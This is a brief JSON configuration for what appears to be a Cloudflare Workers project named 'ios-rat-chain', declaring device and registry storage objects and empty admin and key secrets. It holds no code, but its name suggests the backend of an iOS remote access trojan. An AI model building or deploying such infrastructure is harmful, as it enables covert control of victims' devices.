{
  "name": "ios-rat-chain",
  "main": "worker.js",
  "compatibility_date": "2026-10-20",
  "workers_dev": true,
  "durable_objects": {
    "bindings": [
      { "name": "DEVICE", "class_name": "Device" },
      { "name": "REGISTRY", "class_name": "Registry" }
    ]
  },
  "migrations": [
    { "tag": "v1", "new_sqlite_classes": ["Device", "Registry"] }
  ],
  "secrets": {
    "XG_ADMIN": "",
    "XG_KEY": ""
  }
}
